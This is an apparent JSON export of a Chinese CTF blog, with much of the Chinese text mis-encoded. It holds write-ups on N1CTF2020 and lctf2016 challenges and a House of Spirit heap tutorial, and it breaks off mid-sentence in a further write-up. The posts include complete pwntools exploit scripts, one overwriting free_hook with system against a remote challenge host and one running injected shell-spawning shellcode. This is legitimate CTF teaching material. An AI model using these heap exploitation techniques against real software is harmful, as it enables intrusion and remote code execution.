{"meta":{"title":"Chumen77's Blog","subtitle":"æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿï¼","description":null,"author":"chumen77","url":"http://chumen77.xyz","root":"/"},"pages":[{"title":"chumen77","date":"2020-02-23T11:20:33.000Z","updated":"2020-10-21T14:53:26.237Z","comments":true,"path":"about/index.html","permalink":"http://chumen77.xyz/about/index.html","excerpt":"","text":"æ‡’ç‹—ä¸€æšğŸ¶ OTczMDU5OTgw"}],"posts":[{"title":"N1CTF2020éƒ¨åˆ†wp","slug":"N1CTF2020éƒ¨åˆ†wp","date":"2020-10-19T09:18:47.650Z","updated":"2020-10-21T11:31:51.119Z","comments":true,"path":"2020/10/19/N1CTF2020éƒ¨åˆ†wp/","link":"","permalink":"http://chumen77.xyz/2020/10/19/N1CTF2020éƒ¨åˆ†wp/","excerpt":"","text":"N1CTF2020éƒ¨åˆ†wpsigninè°ƒè¯•one gadget èŠ±äº†è¿‘4å°æ—¶ã€‚ã€‚ğŸ˜­ åˆ†æc++å†™çš„ç¨‹åºï¼Œå­˜åœ¨add show delçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿›å…¥å„è‡ªçš„å‡½æ•°çœ‹ï¼Œçœ‹çš„æ˜¯ç¨€é‡Œç³Šæ¶‚çš„ã€‚ä¸ªäººå‘ç°çš„åªæ˜¯å…¶æŒ‰ç…§è‡ªå·±çš„é€»è¾‘å¯¹å†…å­˜å—idx 1ï¼Œ2è¿›è¡Œå¤„ç†ã€‚ å› ä¸ºåŠŸèƒ½å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥ä¸Šæ‰‹è°ƒè¯•ï¼Œæ¥ç¡®å®šç¨‹åºæ˜¯å¦‚ä½•è¿ä½œçš„ã€‚ ä¸Šæ‰‹è°ƒè¯•åä¼šå‘ç°ï¼Œå…¶æ ¹æ®3ä¸ªæŒ‡é’ˆæ¥å¯¹idx 1ã€2 å¤„ç†ã€‚ åŠ¨è°ƒåˆ†ædef add(idx,data): sla('&gt;','1') sla('dex',str(idx)) sla('ber',str(data)) add(1,1) çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š pwndbg&gt; x/30gx 0x0002032A0 +0x555555554000 0x5555557572a0: 0x0000555555769e70 0x0000555555769e78 0x5555557572b0: 0x0000555555769e78 0x0000000000000000 pwndbg&gt; x/30gx 0x555555769e60 0x555555769e60: 0x0000000000000000 0x0000000000000021 0x555555769e70: 0x0000000000000001 0x0000000000000000 0x555555769e80: 0x0000000000000000 0x000000000000f181 å†æ¬¡ï¼š add(1,1) çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š pwndbg&gt; x/30gx 0x0002032A0 +0x555555554000 0x5555557572a0: 0x0000555555769e90 0x0000555555769ea0 0x5555557572b0: 0x0000555555769ea0 0x0000000000000000 pwndbg&gt; x/30gx 0x555555769e60 0x555555769e60: 0x0000000000000000 0x0000000000000021 0x555555769e70: 0x0000000000000000 0x0000000000000000 0x555555769e80: 0x0000000000000000 0x0000000000000021 0x555555769e90: 0x0000000000000001 0x0000000000000002 0x555555769ea0: 0x0000000000000000 0x000000000000f161 å¯ä»¥è¿™æ ·æ¥ç€æµ‹è¯•free å’Œ delçš„åŠŸèƒ½ã€‚ å°æ€»ç»“é‡ç‚¹å°±æ˜¯bssæ®µå‚¨å­˜å†…å­˜å— 1 2 ä¿¡æ¯çš„3ä¸ªæŒ‡é’ˆã€‚ addå‡½æ•° æŒ‡é’ˆ1å’Œ3æ˜¯ä¸€ä¸ªè¾¹ç•ŒæŒ‡é’ˆï¼ŒæŒ‡é’ˆ2æ˜¯æ•°æ®ç¼–è¾‘æŒ‡é’ˆã€‚æ ¹æ®æŒ‡é’ˆ2å¤„æ¥å†™numberæ•°æ®ï¼Œä¸€æ¬¡æ˜¯8ä¸ªå­—èŠ‚ï¼Œå†™å®Œåï¼ŒæŒ‡é’ˆ2ä¼šåŠ 8ã€‚ å½“æŒ‡é’ˆ2å¤§å°è¶…è¿‡æŒ‡é’ˆ3ï¼Œå…¶å°±ä¼šç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œå…¶ç”³è¯·å®Œå†…å­˜å¤§å°æ˜¯ä»¥0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010 è¿™æ ·é€’å¢ã€‚ ç”³è¯·å®Œæ–°å†…å­˜ï¼Œä¼šæŠŠæŒ‡é’ˆ1å¯¹åº”çš„å†…å­˜å—è¿›è¡Œfreeï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€å—chunkã€‚å¹¶æŠŠä¸Šä¸€å—å†…å­˜ä¸­çš„numberå€¼è¿›è¡Œæ‹·è´åˆ°æ–°ç”³è¯·çš„å†…å­˜ä¸­ã€‚å¹¶ä¸”ä¼šæ ¹æ®ç”³è¯·åˆ°çš„chunkåœ°å€ï¼Œè¿›è¡Œå¯¹bssæ®µ3ä¸ªæŒ‡é’ˆçš„æ›´æ–°ã€‚ freeå‡½æ•° è®©æŒ‡é’ˆ2å‡8. show å‡½æ•° æ‰“å°å‡ºæŒ‡é’ˆ2å‡8åå¯¹åº”åœ°å€ä¸Šçš„æ•°æ®ä¿¡æ¯ æ”»å‡»æ€è·¯idx å†…å­˜å—1 addåˆ°æœ‰0x1010 chunkå—ï¼Œå…¶åŸæ¥çš„0x810ä¼šæ”¾è¿›unsortbin free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2 æŒ‡å‘0x810çš„fdæˆ–è€…bkå¤„ï¼Œåˆ©ç”¨showæ³„æ¼å‡ºlibcåœ°å€ free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2æŒ‡å‘0x20çš„fdå¤„ï¼Œè¿›è¡Œtcache attackï¼Œä¿®æ”¹å…¶ä¸ºfree hook idx å†…å­˜å—2 addæ•°æ®ï¼Œå‡†å¤‡ä¸Šfree hookï¼Œä¸Šfree hook æ”¹free hookä¸ºone gadget ç´§æ¥ç€ç¨‹åºï¼Œå°±free ä¸Šä¸€ä¸ªchunkï¼Œå°±ä¼šè§¦å‘free hook ä½†æ˜¯å†™å®Œexpï¼Œä¼šå‘ç°one gadgetæ²¡æœ‰ä¸€ä¸ªå¯ä»¥æ‰“é€šçš„ï¼Œæ ˆä¸Šå­˜åœ¨å¾ˆå¤šæ•°æ®ï¼Œæ— æ³•æ»¡è¶³ã€‚å°½ç®¡ä½¿ç”¨reallocè¿›è¡Œæ ˆå¸§è°ƒæ•´ï¼Œä¹Ÿæ²¡æ³•å­ã€‚ æ­¤æ—¶çœ‹ä¸€ä¸‹å¯„å­˜å™¨ä¸Šçš„ä¿¡æ¯ï¼Œå‘ç°åˆšé€šè¿‡free hookè·³è½¬è¿‡å»åï¼Œä¸Šé¢çš„rdi rsiä»€ä¹ˆçš„éƒ½æŒ‡å‘äº†å¯æ§çš„heapæ®µï¼Œé‚£å°±ä¿®æ”¹æ€è·¯ï¼Œä¿®æ”¹free hook ä¸ºsystemï¼Œå¹¶ä¸”æå‰ä¿®æ”¹å…¶rdiæŒ‡å‘heapæ®µçš„æ•°æ®ï¼Œä¿®æ”¹ä¸ºsh\\x00 ã€‚è¿™æ ·å†è§¦å‘free hookå°±å¯ä»¥system(sh)äº†ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './signin' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('47.242.161.199',9990) libc = elf.libc # libc = ELF('./libc.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] roc = [0,0x2,0x4,0x6,0x8,0x9] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,data): sla('&gt;','1') sla('dex',str(idx)) sla('ber',str(data)) def free(idx): sla('&gt;','2') sla('dex',str(idx)) def show(idx): sla('&gt;','3') sla('dex',str(idx)) for i in range(258): add(1,0) for i in range(458+57): free(1) show(1) r() libc_base = int(r(15),10) - 0x3ebca0 for i in range(270): free(1) info_addr('libcbase',libc_base) free_hook = 0x3ed8e8 + libc_base add(1,33) add(1,free_hook-8) system = libc.sym['system'] +libc_base add(2,0) add(2,0) free(2) free(2) add(2,26739) add(2,system) add(2,0) itr() ofloå­˜åœ¨èŠ±æŒ‡ä»¤ï¼Œæ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œç›´æ¥å¯ä»¥ç”¨idaæˆ–è€…gdbè¿›è¡Œè·Ÿå³å¯ã€‚ä½†æ˜¯ä¸èƒ½ç›´æ¥æ‰“å¼€ï¼Œä¼šè¢«åè°ƒè¯•ptraceæ£€æµ‹åˆ°ï¼Œå¯ä»¥attachä¸Šå»å³å¯ã€‚ï¼ˆæ³¨æ„æ˜¯rootæƒé™ä¸‹ã€‚ï¼‰ å¼€å§‹ç¨‹åºè®©è¾“å…¥19ä¸ªå­—ç¬¦ï¼Œå…³é”®ä»£ç åœ¨0x400a69,ä½†æ˜¯åçš„æœºå™¨ç ï¼Œgdb ä¸‹watchä¸€ä¸‹ï¼Œå‘ç°æœ‰æµç¨‹åœ¨æ ¹æ®ä½ è¾“å…¥çš„ä¸œè¥¿å¤„ç†è¿™ä¸€å—çš„æœºå™¨ç ï¼Œè¾“å…¥æ­£ç¡®äº†å¯ä»¥æ‰§è¡Œä¸‹å»ã€‚åœ¨å…³é”®ä»£ç å¤„ï¼Œå¯ä»¥å‘ç°å…¶æ˜¯åœ¨å¤„ç†14ä½çš„æ•°æ®ï¼Œä½†æ˜¯åˆšå¼€å§‹è¾“å…¥çš„æ˜¯19ä¸ªï¼Œå¤šå‡ºæ¥çš„5ä¸ªä¸çŸ¥é“ä»€ä¹ˆç”¨ã€‚è°ƒè¯•ä¼šå‘ç°ï¼Œå…¶å°±æ ¹æ®å‰5ä¸ªå­—èŠ‚ï¼Œå¯¹0x400a69å—è¿›è¡Œå¤„ç†ï¼Œä¸€å…±å¤„ç†äº†10æ¬¡ã€‚å¯ä»¥çŒœåˆ°å°±æ˜¯n1ctfã€‚ è¿™å—å¤„ç†å®Œå…¶æ±‡ç¼–ä»£ç ï¼Œå°±æ­£å¸¸äº†ã€‚ for ( i = 0; i &lt;= 13; ++i ) &#123; if ( *(&amp;v4 + i) != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) ) è¿›å…¥ä»¥åå¯ä»¥çœ‹åˆ°å…³é”®ä»£ç ã€‚å…¶æ˜¯åœ¨äºèµ·åˆç¨‹åºï¼Œcat /proc/versionåˆ°çš„å­—ç¬¦ä¸²å–å‰14ä¸ªåœ¨è¿›è¡Œxorã€‚è¦æ˜¯ç»•è¿‡è¿™é‡Œï¼Œæ²¡æœ‰ç›¸åº”å­—ç¬¦ä¸²ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ expkey = [0x35,0x2D,0x11, 0x1A,0x49,0x7D,0x11, 0x14,0x2B,0x3B,0x3E,0x3D,0x3C,0x5F] data = [0x4C, 0x69, 0x6E, 0x75, 0x78, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20] flag = '' for i in range(len(key)): flag += chr(key[i] ^ (data[i]+2)) print(flag)","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"House of Spirit","slug":"House of Spirit","date":"2020-10-09T03:45:32.518Z","updated":"2020-10-10T06:41:06.995Z","comments":true,"path":"2020/10/09/House of Spirit/","link":"","permalink":"http://chumen77.xyz/2020/10/09/House of Spirit/","excerpt":"","text":"House of SpiritHouse of Spiritï¼ˆä¸‹é¢ç§°ä¸ºhosï¼‰æ˜¯ä¸€ä¸ªç»„åˆå‹æ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯å˜é‡è¦†ç›–å’Œå †ç®¡ç†æœºåˆ¶çš„ç»„åˆåˆ©ç”¨ï¼Œå…³é”®åœ¨äºèƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘å¯æ§çš„åŒºåŸŸï¼Œåªè¦æ„é€ å¥½æ•°æ®ï¼Œé‡Šæ”¾åç³»ç»Ÿä¼šé”™è¯¯çš„å°†è¯¥åŒºåŸŸä½œä¸ºå †å—æ”¾åˆ°ç›¸åº”çš„fastbiné‡Œé¢ï¼Œæœ€åå†åˆ†é…å‡ºæ¥çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™æˆ‘ä»¬ç›®æ ‡åŒºåŸŸï¼ˆå¤šä¸ºå‡½æ•°æŒ‡é’ˆå’Œè¿”å›åœ°å€ï¼‰ã€‚ æ ¸å¿ƒæ¡ä»¶ æœ‰æœºä¼šè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘ç›®æ ‡å¯æ§çš„åŒºåŸŸ èƒ½å¤Ÿåœ¨ç›®æ ‡å¯æ§ä½ç½®å¤„ä¼ªé€  fastbin chunk è¿™æ ·å°†å…¶è¿™ä¸ªå †æŒ‡é’ˆé‡Šæ”¾ï¼Œä¼šæ”¾åˆ°ç›¸åº”çš„fastbinï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚ fastbin fake chunk éœ€è¦ç»•è¿‡çš„æ£€æµ‹ fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚ fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ MALLOC_ALIGN_MASK fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚ fake chunk çš„ next chunk çš„å¤§å°ä¸èƒ½å°äº 2 * SIZE_SZï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äºav-&gt;system_mem ã€‚(è¿™ä¸ªå¤§å°è¿˜æ˜¯å¾ˆéšæ„çš„ï¼Œä¸å¿…è¦éå¾—æ˜¯fastbin çš„size ä¾‹å¦‚ :0x1234) fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚ ä¾‹å­#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() &#123; fprintf(stderr, \"This file demonstrates the house of spirit attack.n\"); //è°ƒç”¨ä¸€æ¬¡mallocæ¥åˆå§‹åŒ–å † fprintf(stderr, \"Calling malloc() once so that it sets up its memory.n\"); malloc(1); //ç°åœ¨æˆ‘ä»¬å°†è¦†å†™ä¸€ä¸ªæŒ‡é’ˆæ¥æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„fastbinåŸŸ fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.n\"); unsigned long long *a; //è¿™ä¸ªå’ŒfastbinYæ— å…³,ä¸è¦è¢«è¿™ä¸ª10æ‰€éª—,fake_chunksåªæ˜¯ä¸€å—å†…å­˜ // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); //è¿™ä¸ªåŸŸåŒ…å«äº†ä¸¤ä¸ªchunk,ç¬¬ä¸€ä¸ªä»fake_chunks[1]å¼€å§‹,å¦ä¸€ä¸ªä»fake_chunks[9]å¼€å§‹ fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); //è¿™ä¸ªchunkçš„sizeå¿…é¡»ç¬¦å’Œfastbinçš„è¦æ±‚(&lt;=128 x64ä½ç³»ç»Ÿ),PREV_INUSEä½åœ¨fasybin-sized chunksä¸­ä¹Ÿæ˜¯è¢«å¿½ç•¥çš„,ä½†æ˜¯IS_MAPPEDå’ŒNON_MAIN_ARENä¼šå¼•å‘ä¸€äº›é—®é¢˜ fprintf(stderr, \"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n\"); fake_chunks[1] = 0x40; // this is the size //ä¸‹ä¸€ä¸ªfake chunkçš„sizeå¿…é¡»æ˜¯åˆæ³•çš„ã€‚ å³&gt; 2 * SIZE_SZï¼ˆåœ¨x64ä¸Šéœ€è¦&gt; 16ï¼‰å’Œï¼†&lt;av-&gt; system_memï¼ˆå¯¹äºmain arenaæ¥è¯´ï¼Œé»˜è®¤ä¸º&lt;128kbï¼‰å¹¶ä¸”å¯ä»¥é€šè¿‡nextsizeå®Œæ•´æ€§æ£€æŸ¥ã€‚ ä½†æ˜¯æˆ‘ä»¬æ— éœ€ç¬¦å’ŒFastbinçš„å¤§å° fprintf(stderr, \"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize //ç°åœ¨æˆ‘ä»¬å°†é€šè¿‡æœ‰ç€fake first chunksçš„fakeåŒºåŸŸåœ°å€æ¥è¦†å†™æˆ‘ä»¬çš„æŒ‡é’ˆ fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n\", &amp;fake_chunks[1]); //è¦æ³¨æ„çš„æ˜¯,chunkå¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.n\"); free(a); //ç°åœ¨ä¸‹ä¸€æ¬¡çš„mallocå°±å°†ä¼šè¿”å›æˆ‘ä»¬çš„fake chunkäº† fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %pn\", malloc(0x30)); &#125; æ­£å¸¸çš„hosæ˜¯éœ€è¦ä¼ªé€ ä¸¤ä¸ªchunkçš„ã€‚ This file demonstrates the house of spirit attack. Calling malloc() once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298. This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260! malloc(0x30): 0x7ffe23a56260 ç¨‹åºé¦–å…ˆåˆå§‹åŒ–äº†ä¸€ä¸‹å †,ç„¶åç”³è¯·äº†ä¸¤ä¸ªå˜é‡,ä¸€ä¸ªæ˜¯æˆ‘ä»¬å³å°†æ”»å‡»çš„å˜é‡ a,å¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„fake_chunks ç¨‹åºå…ˆåœ¨fake_chunks[1]çš„åœ°æ–¹ä¹Ÿå°±æ˜¯sizeåŸŸä¼ªé€ äº†åˆæ³•çš„size,0x40(æ»¡è¶³fastbin sizeå¤§å°,ä¸16å­—èŠ‚å¯¹é½,æ ‡å¿—ä½æ­£ç¡®) ä¹‹ååˆåœ¨ä¸‹ä¸€å¤„ä¼ªé€ äº†ç¬¬äºŒä¸ªchunk,å³ä»fake_chunks[8]å¼€å§‹çš„åœ°æ–¹,è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢,å› ä¸ºæˆ‘ä»¬ç¬¬ä¸€ä¸ªfake chunkçš„sizeä¼ªé€ æˆäº†0x40,é‚£ä¹ˆæˆ‘ä»¬ç¬¬äºŒä¸ªchunkå°±éœ€è¦åœ¨å‘ä¸‹0x40çš„åœ°æ–¹ä¹Ÿå°±æ˜¯fake_chunks+8çš„åœ°æ–¹ä¼ªé€ ç¬¬äºŒä¸ªchunkã€‚ å°æ€»ç»“ä½¿ç”¨è¯¥æŠ€æœ¯åˆ†é… chunk åˆ°æŒ‡å®šåœ°å€ï¼Œä½¿ç›®æ ‡ä½ç½®æˆä¸ºå¯æ§åŒºåŸŸï¼Œå…³é”®æ˜¯è¦èƒ½å¤Ÿä¿®æ”¹æŒ‡å®šåœ°å€çš„å‰åçš„å†…å®¹ï¼Œä¼ªé€ å‡º2ä¸ªå †ï¼Œä½¿å…¶å¯ä»¥ç»•è¿‡å¯¹åº”çš„æ£€æµ‹ã€‚ è¿˜æœ‰å°±æ˜¯è¦æœ‰åŠæ³•è¦†ç›–å †æŒ‡é’ˆï¼Œåˆ°ç›®æ ‡åœ°å€ã€‚ lctf2016_pwn200åˆ†æ å¼€å¤´ä¸è¾“å…¥\\nï¼Œå¡«å……48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€ æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr int sub_400A29() &#123; char buf; // [rsp+0h] [rbp-40h] char *dest; // [rsp+38h] [rbp-8h] dest = (char *)malloc(0x40uLL); puts(\"give me money~\"); read(0, &amp;buf, 0x40uLL); strcpy(dest, &amp;buf); ptr = dest; return sub_4009C4(); &#125; ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚ ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚ æ”»å‡»æ€è·¯ åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address å¯ä»¥å…ˆçœ‹ä¸€ä¸‹å¯æ§æ ˆçš„å†…å­˜æƒ…å†µ,æ­¤å‰idè¾“å…¥çš„æ˜¯65ï¼š å‰0x40ä¸ºå¯æ§åŒºåŸŸï¼Œç®­å¤´æŒ‡çš„æ–¹å‘æ˜¯å¯ä»¥è¦†ç›–çš„å †æŒ‡é’ˆï¼Œidçš„ä¸Šæ–¹æœ‰ä¸€ä¸ªret addressï¼Œå…¶åœ¨è¾“å…¥3é€€å‡ºæ—¶å¯ä»¥è·³è½¬åˆ°ã€‚æ‰€ä»¥å…¶ä¸ºç›®æ ‡åœ°å€ï¼Œå…¶å‰é¢æœ‰å¯æ§çš„0x40çš„åŒºåŸŸï¼Œåé¢ä¹Ÿæœ‰ä¸€ä¸ªid 0x8çš„å¯æ§åŒºåŸŸï¼Œæ»¡è¶³æ¡ä»¶ å¼€å§‹æ„é€ ï¼š è¿™æ ·freeä¸€ä¸‹å°±ä¼šæœ‰ä¸ªè¿›å…¥fastbin åœ¨æ ˆä¸Šçš„fakeå †ï¼Œç”³è¯·ä¸Šå»å³å¯ä¿®æ”¹åˆ°ç›®æ ‡åŒºåŸŸã€‚ ä¿®æ”¹ret addreeä¸ºshellcodeçš„åœ°å€ã€‚å…¶å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡è®©ä½ è¾“å…¥æ—¶ï¼Œæ”¾å…¥æ ˆä¸­ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn200' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26670) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('long',str(size)) sa('me',str(data)) def free(): sla('choice','2') shellcode = asm(shellcraft.sh()) sa('u',shellcode) ru('\\x05') leak_stack = uu64(r(6)) info_addr('leak_stack',leak_stack) shellcode_addr = leak_stack - 0x50 # debug() sla('id','65') payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90) sa('money',payload) free() payload = p64(0)*3 + p64(shellcode_addr) add(0x38,payload) sleep(0.2) sla('choice','3') # debug() itr() å‚è€ƒé“¾æ¥https://www.anquanke.com/post/id/199468#h2-19https://www.anquanke.com/post/id/85357https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"Houseç³»åˆ—","slug":"Houseç³»åˆ—","permalink":"http://chumen77.xyz/tags/Houseç³»åˆ—/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp","slug":"è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp","date":"2020-10-09T00:23:05.599Z","updated":"2020-10-14T15:43:53.754Z","comments":true,"path":"2020/10/09/è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp/","link":"","permalink":"http://chumen77.xyz/2020/10/09/è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp/","excerpt":"","text":"è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wpmmutagåˆ†æ ç»™äº†ä¸€ä¸ªæ ˆåœ°å€ æ²¡æœ‰showå‡½æ•° free å‡½æ•°å­˜åœ¨uaf addå‡½æ•°åªèƒ½ç”³è¯·å †å·ä¸º1-10çš„å †å—ï¼Œå¤§å°ä»…ä¸º0x68 å¯ä»¥ç»™æ ˆä¸Šè¯»ä¸€æ®µæ•°æ® char buf; // [rsp+10h] [rbp-20h] if ( v3 != 3 ) break; read(0, &amp;buf, 0x20uLL); printf(\"Your content: %s\\n\", &amp;buf); åˆ©ç”¨è¿™ä¸ªå¯ä»¥æ³„æ¼æ ˆä¸Šçš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥åœ¨æ ˆä¸Šå†™ä¸€å®šçš„æ•°æ®ã€‚ éš¾ç‚¹å¦‚ä½•æ³„æ¼libcåœ°å€ã€‚ æ ˆä¸Šæ˜¯æœ‰å¾ˆå¤šæ•°æ®çš„ï¼Œå¯ä»¥ç”¨choice 3è¿›è¡Œæ³„æ¼ä¸€å®šçš„æ•°æ®ï¼Œä½†æ˜¯ç”±äº\\x00çš„æˆªæ–­ï¼Œæ³„æ¼ä¸€ä¸ªstackåœ°å€åï¼Œå…¶åæœ‰ç”¨çš„libcåœ°å€æ²¡åŠæ³•æ³„æ¼ã€‚ çœ‹ä¸‹å…¶æ ˆæƒ…å†µï¼š å¯æ§åŒºåŸŸ0x20ï¼Œå¦‚æœå¯ä»¥å¡«å……å…¶ä¸­æ— ç”¨çš„æ•°æ®åˆ°libcåœ°å€ï¼Œå†åˆ©ç”¨ä¸€æ¬¡ choice 3 å³å¯å®Œæˆæ³„æ¼ã€‚ ç°åœ¨ä¹Ÿå·²ç»çŸ¥é“äº†stackçš„åœ°å€ã€‚ä¼ªé€ 